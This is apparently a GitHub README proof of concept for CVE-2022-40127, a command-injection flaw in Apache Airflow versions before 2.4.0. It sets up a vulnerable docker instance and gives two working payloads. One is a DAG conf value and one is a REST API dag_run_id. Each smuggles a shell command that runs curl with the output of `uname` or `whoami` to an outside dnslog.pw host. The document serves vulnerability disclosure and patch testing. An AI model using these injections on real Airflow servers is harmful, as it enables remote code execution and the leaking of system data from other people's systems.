# CVE-2022-40127
Apache Airflow &lt; 2.4.0 DAG  example_bash_operator RCE

# poc docker env:

```
mkdir CVE-2022-40127 && cd CVE-2022-40127 
curl -LfO 'https://airflow.apache.org/docs/apache-airflow/2.3.4/docker-compose.yaml'
#or wget https://github.com/Mr-xn/CVE-2022-40127/raw/main/docker-compose.yaml
mkdir -p ./dags ./logs ./plugins
echo -e "AIRFLOW_UID=$(id -u)" > .env
docker-compose up airflow-init
docker-compose up -d
#waiting some times
open localhost:8080
```

# POC 1

example_bash_operator

```
{"fxoxx":"\";curl `uname`.lxx2.535ld4zn.dnslog.pw;\""}
```

<img width="952" alt="image" src="https://user-images.githubusercontent.com/18260135/202715494-4ca2fd4f-384e-40aa-ae7b-02ca51defa4f.png">

## dnslog via

<img width="414" alt="image" src="https://user-images.githubusercontent.com/18260135/202846433-4a4a40fa-675e-477b-a9c4-be2f6c894583.png">


# POC 2

```
curl -X 'POST' \
  'http://10.11.12.131:8080/api/v1/dags/example_bash_operator/dagRuns' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
    "conf": {
"dag_run": "api2"
},
  "dag_run_id": "id \"&& curl `whoami`.api222.535ld4zn.dnslog.pw",
  "logical_date": "2022-11-19T10:13:13.920Z"

}'
```

http://localhost:8080/redoc#tag/DAGRun/operation/post_dag_run
<img width="1638" alt="image" src="https://user-images.githubusercontent.com/18260135/202846307-165943c3-dd8e-4d92-aae8-72516fc00f82.png">

http://localhost:8080/api/v1/ui/#/DAGRun/post_dag_run
<img width="1454" alt="image" src="https://user-images.githubusercontent.com/18260135/202846350-ca6d0770-8143-4da8-8ac5-1596f365cff9.png">

<img width="1453" alt="image" src="https://user-images.githubusercontent.com/18260135/202846365-e4d0b467-7e06-4112-899b-14245dc17b5f.png">

## dnslog via

<img width="408" alt="image" src="https://user-images.githubusercontent.com/18260135/202846417-9d359d5a-cc6f-4be2-8003-cfefd3d488f4.png">


commit:  

https://github.com/apache/airflow/pull/25960/files#diff-7c35dc3aa6659f910139c28057dfc663dd886dd0dfb3d8a971603c2ae7790d2a

links: 

https://stackoverflow.com/questions/67110383/how-to-trigger-airflow-dag-with-rest-api-i-get-property-is-read-only-state
